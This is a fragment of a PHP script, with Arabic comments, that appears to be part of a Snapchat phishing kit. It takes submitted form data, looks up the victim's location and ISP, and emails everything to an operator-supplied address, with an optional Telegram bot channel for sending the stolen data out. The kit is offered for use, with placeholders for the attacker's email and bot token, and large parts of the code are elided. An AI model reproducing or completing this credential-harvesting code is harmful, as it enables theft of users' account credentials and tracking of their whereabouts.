...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if ($geo && isset($geo_data['status']) && $geo_data['status'] === 'success') {
        ...
        $country = 'فشل جلب الموقع (استخدم localhost)';
        $city = 'فشل';
        $lat = '0';
        $lon = '0';
        $isp = 'فشل';
    ...
    // ------ إرسال البريد الإلكتروني (ضع بريدك) ------
    $to = 'your-email@example.com'; // ⬅️ غيّر هذا
    $subject = '📸 بيانات سناب شات + معلومات كاملة';
    ...
    // ------ (اختياري) إرسال لتلغرام (افتح الكومنت إذا أردت) ------
    /*
    $bot_token = 'توكنك';
    $chat_id = 'ايديك';
